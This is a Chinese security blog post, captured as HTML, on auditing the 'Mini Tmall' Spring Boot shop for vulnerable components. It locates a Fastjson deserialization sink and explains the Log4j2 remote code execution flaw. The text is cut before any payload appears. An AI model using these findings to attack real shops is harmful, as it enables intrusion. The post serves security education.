

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Power7089">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言：【如需转载，请详细表明来源，请勿设置原创】 嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。 欢迎大家扫描下方二维码关注 “闪石星曜CyberSecurity” 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。  如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@J">
<meta property="og:type" content="article">
<meta property="og:title" content="JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计">
<meta property="og:url" content="http://example.com/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E7%89%88%EF%BC%8C%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8%E7%BA%A7%E7%B3%BB%E7%BB%9F%E7%9A%84Log4j2shell%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Power7089">
<meta property="og:description" content="前言：【如需转载，请详细表明来源，请勿设置原创】 嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。 欢迎大家扫描下方二维码关注 “闪石星曜CyberSecurity” 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。  如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@J">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/%E6%88%91%E7%9A%84%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BA%8C%E7%BB%B4%E7%A0%81.gif">
<meta property="og:image" content="http://example.com/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg">
<meta property="og:image" content="http://example.com/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg">
<meta property="og:image" content="http://example.com/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%AE%87%E5%AE%99.jpg">
<meta property="og:image" content="http://example.com/img/%E5%88%9B%E5%BB%BA%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.jpg">
<meta property="og:image" content="http://example.com/img/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE.jpg">
<meta property="og:image" content="http://example.com/img/%E5%8A%A0%E8%BD%BD%E6%88%90%E5%8A%9F.jpg">
<meta property="og:image" content="http://example.com/img/%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.jpg">
<meta property="og:image" content="http://example.com/img/idea%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F.jpg">
<meta property="og:image" content="http://example.com/img/%E5%89%8D%E5%8F%B0%E9%A1%B5%E9%9D%A2.jpg">
<meta property="og:image" content="http://example.com/img/%E5%90%8E%E5%8F%B0%E9%A1%B5%E9%9D%A2.jpg">
<meta property="og:image" content="http://example.com/img/%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2parseObject.jpg">
<meta property="og:image" content="http://example.com/img/propertyJson%E5%8F%82%E6%95%B0.jpg">
<meta property="og:image" content="http://example.com/img/log4j%E5%BC%95%E5%85%A5.jpg">
<meta property="og:image" content="http://example.com/img/%E5%89%94%E9%99%A4%E9%BB%98%E8%AE%A4%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95.jpg">
<meta property="og:image" content="http://example.com/img/logger%E5%85%B3%E9%94%AE%E5%AD%97%E6%90%9C%E7%B4%A2.jpg">
<meta property="og:image" content="http://example.com/img/%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0loggerinfo.jpg">
<meta property="og:image" content="http://example.com/img/logger%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81.jpg">
<meta property="og:image" content="http://example.com/img/sql%E6%B3%A8%E5%85%A5%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%AD%97.jpg">
<meta property="og:image" content="http://example.com/img/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E8%B7%B3%E8%BD%AC.jpg">
<meta property="og:image" content="http://example.com/img/mapperjava%E6%96%87%E4%BB%B6.jpg">
<meta property="og:image" content="http://example.com/img/%E6%9F%A5%E7%9C%8Bselect%E4%BD%BF%E7%94%A8.jpg">
<meta property="og:image" content="http://example.com/img/sql%E6%B3%A8%E5%85%A5impl%E5%B1%82.jpg">
<meta property="og:image" content="http://example.com/img/getlist%E4%BD%BF%E7%94%A8.jpg">
<meta property="og:image" content="http://example.com/img/UserController%E7%9A%84SQL%E6%B3%A8%E5%85%A5.jpg">
<meta property="og:image" content="http://example.com/img/orderUitl%E7%B1%BB.jpg">
<meta property="og:image" content="http://example.com/img/orderby%E5%AD%97%E6%AE%B5.jpg">
<meta property="og:image" content="http://example.com/img/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD.jpg">
<meta property="og:image" content="http://example.com/img/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%BF%BB%E9%A1%B5%E6%8A%93%E5%8C%85.jpg">
<meta property="og:image" content="http://example.com/img/fillter%E5%B1%82.jpg">
<meta property="og:image" content="http://example.com/img/pom%E5%BC%95%E5%85%A5jsp.jpg">
<meta property="og:image" content="http://example.com/img/JSP%E4%BE%9D%E8%B5%96.jpg">
<meta property="og:image" content="http://example.com/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81.jpg">
<meta property="og:image" content="http://example.com/img/fastjson%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84.png">
<meta property="og:image" content="http://example.com/img/%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BB%B6%E5%95%86%E5%93%81%E6%BC%8F%E6%B4%9E%E7%82%B9.png">
<meta property="og:image" content="http://example.com/img/url%E8%A7%A3%E7%A0%81%E5%8F%82%E6%95%B0.png">
<meta property="og:image" content="http://example.com/img/fastjson%E8%8E%B7%E5%8F%96dnslog.png">
<meta property="og:image" content="http://example.com/img/fastjson%E6%BC%8F%E6%B4%9Epoc.png">
<meta property="og:image" content="http://example.com/img/fastjson-dnslog%E6%88%90%E5%8A%9F%E6%8E%A2%E6%B5%8B.png">
<meta property="og:image" content="http://example.com/img/%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B4%E5%83%8F%E5%A4%84.jpg">
<meta property="og:image" content="http://example.com/img/%E4%B8%8A%E4%BC%A0%E6%8A%93%E5%8C%85.jpg">
<meta property="og:image" content="http://example.com/img/%E8%8E%B7%E5%8F%96dnslog%E5%9C%B0%E5%9D%80.jpg">
<meta property="og:image" content="http://example.com/img/%E7%B2%98%E8%B4%B4%E6%9E%84%E9%80%A0%E7%9A%84dnslog%E9%AA%8C%E8%AF%81%E8%AF%AD%E5%8F%A5.jpg">
<meta property="og:image" content="http://example.com/img/dnslog%E6%8E%A5%E5%8F%97%E6%8E%A2%E6%B5%8B.jpg">
<meta property="og:image" content="http://example.com/img/%E5%A4%96%E5%B8%A6OS%E4%BF%A1%E6%81%AF.jpg">
<meta property="og:image" content="http://example.com/img/%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%9C.png">
<meta property="og:image" content="http://example.com/img/jdni%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8.jpg">
<meta property="og:image" content="http://example.com/img/jndi%E5%B7%A5%E5%85%B7%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%93%BE%E6%8E%A5.jpg">
<meta property="og:image" content="http://example.com/img/jndi%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8.jpg">
<meta property="og:image" content="http://example.com/img/sql%E6%B3%A8%E5%85%A5%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%8C%85.jpg">
<meta property="og:image" content="http://example.com/img/orderby%E7%AD%89%E4%BA%8E1.jpg">
<meta property="og:image" content="http://example.com/img/orderby%E7%AD%89%E4%BA%8E99.jpg">
<meta property="og:image" content="http://example.com/img/r-txt.jpg">
<meta property="og:image" content="http://example.com/img/sqlmap-r.jpg">
<meta property="og:image" content="http://example.com/img/SQLmap%E7%BB%93%E6%9E%9C.jpg">
<meta property="og:image" content="http://example.com/img/%E7%AE%A1%E7%90%86%E5%91%98%E6%98%B5%E7%A7%B0%E4%BF%9D%E5%AD%98xss.png">
<meta property="og:image" content="http://example.com/img/xss%E6%BC%8F%E6%B4%9E%E5%BC%B9%E6%A1%861.jpg">
<meta property="og:image" content="http://example.com/img/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E5%8C%85.jpg">
<meta property="og:image" content="http://example.com/img/%E4%B8%8A%E4%BC%A0jsp%E6%9C%A8%E9%A9%AC.jpg">
<meta property="og:image" content="http://example.com/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%9B%BE%E7%89%87url.jpg">
<meta property="og:image" content="http://example.com/img/%E6%96%B0%E5%A2%9E%E5%86%B0%E8%9D%8E.jpg">
<meta property="og:image" content="http://example.com/img/%E8%BF%9E%E6%8E%A5JSP%E6%9C%A8%E9%A9%AC.jpg">
<meta property="article:published_time" content="2022-08-22T02:38:46.000Z">
<meta property="article:modified_time" content="2022-10-10T02:36:35.053Z">
<meta property="article:author" content="Power7089">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/%E6%88%91%E7%9A%84%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BA%8C%E7%BB%B4%E7%A0%81.gif">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计 - Power7089</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":88,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"yxPaB1iPDz9V47o8ASUol6fh-gzGzoHsz","app_key":"PyweBFOvttknCdKW7DspREFV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Power7089的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-08-22 10:38" pubdate>
          2022年8月22日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          13k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          106 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>【如需转载，请详细表明来源，请勿设置原创】</p>
<p>嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。</p>
<p>欢迎大家扫描下方二维码关注 <strong>“闪石星曜CyberSecurity”</strong> 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。</p>
<p><img src="/img/%E6%88%91%E7%9A%84%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BA%8C%E7%BB%B4%E7%A0%81.gif" srcset="/img/loading.gif" lazyload alt="公众号"></p>
<p>如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也对应着深入学习的方向。</p>
<p>炼石计划理念：一个系统化从入门到提升学习的成长型知识星球。这里不仅注重夯实基础，更加专注实战进阶。</p>
<p>欢迎微信扫描下方二维码，加入对应的知识星球。努力成为六边形网络安全战士！</p>
<p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" srcset="/img/loading.gif" lazyload alt="炼石计划@Java代码审计"></p>
<p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" srcset="/img/loading.gif" lazyload alt="炼石计划@PHP代码审计"></p>
<p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%AE%87%E5%AE%99.jpg" srcset="/img/loading.gif" lazyload alt="炼石计划@渗透攻防宇宙"></p>
<p>本篇来自【炼石计划@Java代码审计】知识星球内部文章，公益分享学习。欢迎加入我们，系统化学习专业知识。</p>
<h2 id="一、项目简介"><a href="#一、项目简介" class="headerlink" title="一、项目简介"></a>一、项目简介</h2><p>迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。</p>
<h2 id="二、项目搭建"><a href="#二、项目搭建" class="headerlink" title="二、项目搭建"></a>二、项目搭建</h2><h3 id="1、环境要求"><a href="#1、环境要求" class="headerlink" title="1、环境要求"></a>1、环境要求</h3><p>1、<code>Windows 10</code>系统。</p>
<p>2、Java版本为<code>1.8.0_261</code>。</p>
<p>3、Mysql版本为<code>5.7</code>。我用的是PHPstudy集成的。</p>
<p>4、IDEA版本随意。</p>
<h3 id="2、项目部署流程"><a href="#2、项目部署流程" class="headerlink" title="2、项目部署流程"></a>2、项目部署流程</h3><p>①、命令行进入Mysql后，创建数据库名为<code>tmalldemodb</code>，并切换使用该数据库，如下图所示：</p>
<p><img src="/img/%E5%88%9B%E5%BB%BA%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" srcset="/img/loading.gif" lazyload alt="创建使用数据库"></p>
<p>②、将项目文件中的<code>/sqls/tmalldemodb.sql</code>的数据导入到<code>tmalldemodb</code>数据库，注意导入路径中应使用正斜杠<code>/</code>，如下图所示：</p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE.jpg" srcset="/img/loading.gif" lazyload alt="数据库中导入数据"></p>
<p>③、使用IDEA打开本项目，等待Maven自动加载依赖项，如果时间较长需要自行配置Maven加速源。几个现象表明项目部署成功。<code>pom.xml</code>文件无报错，项目代码已编译为<code>class</code>，<code>Run/Debug Configurations...</code>处显示可以运行。如下图所示：</p>
<p><img src="/img/%E5%8A%A0%E8%BD%BD%E6%88%90%E5%8A%9F.jpg" srcset="/img/loading.gif" lazyload alt="加载成功"></p>
<p>④、修改<code>src/main/resouces/application.properties</code>配置文件内容，具体如下图所示：</p>
<p><img src="/img/%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.jpg" srcset="/img/loading.gif" lazyload alt="修改配置文件"></p>
<p>⑤、点击启动<code>Run/Debug Configurations...</code>本项目，启动成功如下图所示：</p>
<p><img src="/img/idea%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F.jpg" srcset="/img/loading.gif" lazyload alt="idea项目启动成功"></p>
<p>⑥、项目访问地址如下：</p>
<ul>
<li>前台地址：<code>http://127.0.0.1:8088/tmall</code></li>
<li>后台地址：<code>http://127.0.0.1:8088/tmall/admin</code></li>
</ul>
<p><img src="/img/%E5%89%8D%E5%8F%B0%E9%A1%B5%E9%9D%A2.jpg" srcset="/img/loading.gif" lazyload alt="前台页面"></p>
<p><img src="/img/%E5%90%8E%E5%8F%B0%E9%A1%B5%E9%9D%A2.jpg" srcset="/img/loading.gif" lazyload alt="后台页面"></p>
<p><strong>本项目Github地址：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tee.com<span class="hljs-regexp">/project_team/</span>Tmall_demo<br></code></pre></td></tr></table></figure>

<h2 id="三、代码审计漏洞挖掘"><a href="#三、代码审计漏洞挖掘" class="headerlink" title="三、代码审计漏洞挖掘"></a>三、代码审计漏洞挖掘</h2><h3 id="1、第三方组件漏洞审计"><a href="#1、第三方组件漏洞审计" class="headerlink" title="1、第三方组件漏洞审计"></a>1、第三方组件漏洞审计</h3><p>本项目是基于Maven构建的。对于Maven项目，我们首先从<code>pom.xml</code>文件开始审计引入的第三方组件是否存在漏洞版本，然后进一步验证该组件是否存在漏洞点。</p>
<p>本项目引入的组件以及组件版本整理如下。</p>
<table>
<thead>
<tr>
<th>组件名称</th>
<th>组件版本</th>
</tr>
</thead>
<tbody><tr>
<td>SpringBoot</td>
<td>2.1.6.RELEASE</td>
</tr>
<tr>
<td>Fastjson</td>
<td>1.2.58</td>
</tr>
<tr>
<td>Mysql</td>
<td>5.1.47</td>
</tr>
<tr>
<td>Druid</td>
<td>1.1.19</td>
</tr>
<tr>
<td>Taglibs</td>
<td>1.2.5</td>
</tr>
<tr>
<td>Mybatis</td>
<td>3.5.1</td>
</tr>
<tr>
<td>Log4j</td>
<td>2.10.0</td>
</tr>
</tbody></table>
<p>整理完成后，如何确定该组件版本存在漏洞？最简单的方法无疑于从搜索引擎进行搜索，比如关键字：<code>Fastjson 漏洞</code>。进一步可从组件官网，CVE，CNVD，CNNVD等网站查询。</p>
<h3 id="2、组件漏洞代码审计"><a href="#2、组件漏洞代码审计" class="headerlink" title="2、组件漏洞代码审计"></a>2、组件漏洞代码审计</h3><p>通过查看<code>pom.xml</code>文件中引入的第三方插件，且经过搜索查询，发现Fastjson、Log4j、Mybatis引入存在漏洞的版本，我们进一步验证是否存在漏洞。</p>
<h3 id="2-1、Fastjson漏洞代码审计"><a href="#2-1、Fastjson漏洞代码审计" class="headerlink" title="2.1、Fastjson漏洞代码审计"></a>2.1、Fastjson漏洞代码审计</h3><p>本项目引入的Fastjson版本为1.2.58，该版本存在反序列化漏洞。我们进一步探索一番。</p>
<h4 id="2-1-1、Fastjson简述"><a href="#2-1-1、Fastjson简述" class="headerlink" title="2.1.1、Fastjson简述"></a>2.1.1、Fastjson简述</h4><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java对象之间相互转换。</p>
<p>两个主要接口是JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse，分别实现序列化和反序列化操作。</p>
<h4 id="2-1-1、Fastjson反序列化简述"><a href="#2-1-1、Fastjson反序列化简述" class="headerlink" title="2.1.1、Fastjson反序列化简述"></a>2.1.1、Fastjson反序列化简述</h4><p>Fastjson反序列化漏洞简单来说是出现在将JSON数据反序列化过程中出现的漏洞。</p>
<p>攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p>
<h4 id="2-1-2、寻找漏洞触发点"><a href="#2-1-2、寻找漏洞触发点" class="headerlink" title="2.1.2、寻找漏洞触发点"></a>2.1.2、寻找漏洞触发点</h4><p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。我们关注两个函数<code>JSON.parse()</code>和<code>JSON.parseObject()</code>。</p>
<p>全局搜索两个关键字，发现本项目存在<code>JSON.parseObject()</code>，如下图所示：</p>
<p><img src="/img/%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2parseObject.jpg" srcset="/img/loading.gif" lazyload alt="全局搜索parseObject"></p>
<p>双击进入<code>ProductController.java</code>文件，问题代码出现在了<code>第151行</code>，使用<code>JSON.parseObject()</code>方法反序列化了<code>propertyJson</code>参数，我们向上追踪<code>propertyJson</code>参数，该参数是<code>添加产品信息</code>接口中<code>产品属性JSON</code>字段。如下图所示：</p>
<p><img src="/img/propertyJson%E5%8F%82%E6%95%B0.jpg" srcset="/img/loading.gif" lazyload alt="propertyJson参数"></p>
<p>通过代码审计，找到了Fastjson反序列化漏洞点。我们通过渗透测试进一步验证。</p>
<h3 id="2-2、Log4j漏洞代码审计"><a href="#2-2、Log4j漏洞代码审计" class="headerlink" title="2.2、Log4j漏洞代码审计"></a>2.2、Log4j漏洞代码审计</h3><p>本项目引入的Log4j版本为2.10.0，该版本存在远程代码执行漏洞。我们进一步探索一下。</p>
<h4 id="2-2-1、Log4j简述"><a href="#2-2-1、Log4j简述" class="headerlink" title="2.2.1、Log4j简述"></a>2.2.1、Log4j简述</h4><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
<h4 id="2-2-2、Log4j远程代码执行漏洞（CVE-2021-44228）简述"><a href="#2-2-2、Log4j远程代码执行漏洞（CVE-2021-44228）简述" class="headerlink" title="2.2.2、Log4j远程代码执行漏洞（CVE-2021-44228）简述"></a>2.2.2、Log4j远程代码执行漏洞（CVE-2021-44228）简述</h4><p>由于Apache Log4j2某些功能存在递归解析，攻击者可在未经身份验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码。</p>
<p>其中涉及到的lookup的主要功能就是提供另外一种方式以添加某些特殊的值到日志中，<strong>以最大化松散耦合地提供可配置属性供使用者以约定的格式进行调用。</strong></p>
<p>该组件漏洞主要发生在引入的<code>log4j-core</code>，<code>log4j-api</code>是不存在该问题的。<code>log4j-core</code>是源码，<code>log4j-api</code>是接口。</p>
<p><code>pom.xml</code>文件引入Log4j组件情况如下图所示，引入了<code>log4j-core</code>，以及版本为<code>2.10.0</code>。基本确定存在问题，验证还需进一步寻找能触发的漏洞点。</p>
<p><img src="/img/log4j%E5%BC%95%E5%85%A5.jpg" srcset="/img/loading.gif" lazyload alt="log4j引入"></p>
<p>由于SprinBoot默认自带日志记录框架，一般不需要引入，在<code>pom.xml</code>中剔除出去。如下图所示：</p>
<p><img src="/img/%E5%89%94%E9%99%A4%E9%BB%98%E8%AE%A4%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95.jpg" srcset="/img/loading.gif" lazyload alt="剔除默认日志记录"></p>
<h4 id="2-2-3、寻找漏洞触发点"><a href="#2-2-3、寻找漏洞触发点" class="headerlink" title="2.2.3、寻找漏洞触发点"></a>2.2.3、寻找漏洞触发点</h4><p>全局搜索关键字<code>logger</code>，如下图可以看出，本项目使用<code>logger.info</code>级别记录日志方式居多。</p>
<p><img src="/img/logger%E5%85%B3%E9%94%AE%E5%AD%97%E6%90%9C%E7%B4%A2.jpg" srcset="/img/loading.gif" lazyload alt="logger关键字搜索"></p>
<p>大多漏洞分析文章使用<code>logger.error</code>去做调试。两者区别在于默认记录信息不同。这块内容留个作业，大家自行搜索下，不难理解。</p>
<p>经过一番探索，发现有几处日志记录拼接了变量参数，让我们看看这些参数是否是从前端传来的。如下图所示：</p>
<p><img src="/img/%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0loggerinfo.jpg" srcset="/img/loading.gif" lazyload alt="头像上传loggerinfo"></p>
<p>双击即可进入该代码文件，该文件位于<code>src\main\java\com\xq\tmall\controller\admin\AccountController.java</code>。该代码文件位于Controller层，主要用于和视图交互，处理用户输入的数据等操作。</p>
<p>关键代码如下图所示：</p>
